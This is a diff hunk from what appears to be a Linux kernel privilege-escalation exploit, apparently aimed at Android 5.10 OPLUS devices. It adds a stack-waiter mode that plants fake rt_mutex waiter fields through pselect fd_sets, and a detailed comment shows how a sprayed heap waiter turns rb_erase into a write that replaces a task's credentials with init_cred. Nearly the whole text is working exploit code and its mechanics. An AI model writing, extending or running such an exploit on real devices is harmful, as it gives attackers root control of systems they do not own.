@@ -331,6 +331,45 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
       pr_info("stack mode4 SIMPLE in0=fake_w0 ex0=%016llx(init_task_p0) "
               "ex1=fake_lock ex2=3 (heap W0 pi write)\n",
               (unsigned long long)init_task);
+    } else if (env_flag("MODE4_JC2", 0)) {
+      /*
+       * JoinChang upstream mode-2 (words_compact; 5.10 OPLUS: waiter
+       * word=0): the ghost stack waiter is a BENIGN CARRIER — no write
+       * geometry on the stack at all. Only words 2-9 are stamped
+       * (words 0/1 keep the original sole-waiter 0/0; with shift=-2
+       * they cannot be placed anyway):
+       *   tree_left=0  pi_parent=0  pi_right=0  pi_left=0
+       *   task=fake_task  lock=fake_lock  prio=0  deadline=0
+       * The write lives in the SPRAYED W0 heap waiter (util.c
+       * pselect_custom_write==2): W0.pi = {pc=target-8,
+       * right=REAL init_cred, left=0}. When the unlock's
+       * mark_wakeup_next_waiter dequeues the top waiter W0
+       * (rt_mutex_dequeue_pi(current, W0)), rb_erase Case 1a does
+       *   store-1: *(init_cred+0)=pc  (usage = huge refcount, harmless)
+       *   store-2: *(target-8+8) = init_cred  ->  *task.cred = init_cred
+       * No rebalance (child-present case). fake_task.pi_waiters NULL.
+       */
+      struct pselect_waiter_word jc2_words[] = {
+          {2, 0, "tree_left"},
+          {3, 0, "pi_parent"},
+          {4, 0, "pi_right"},
+          {5, 0, "pi_left"},
+          {6, (uint64_t)fake_task, "task"},
+          {7, (uint64_t)fake_lock, "lock"},
+          {8, 0, "prio"},
+          {9, 0, "deadline"},
+      };
+      for (size_t i = 0; i < sizeof(jc2_words) / sizeof(jc2_words[0]);
+           i++) {
+        pselect_put_waiter_word(in, out, ex, words_per_set,
+                                jc2_words[i].word, jc2_words[i].value,
+                                jc2_words[i].name);
+      }
+      pr_info("stack JC2 carrier: words2-9 zero, task=%016llx "
+              "lock=%016llx prio=0 (write via W0.pi store-2)\n",
+              (unsigned long long)fake_task,
+              (unsigned long long)fake_lock);
+      goto stack_words_done;
     } else {
       uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
       /* word8 = init_task: its on_rq==1 makes the post-erase
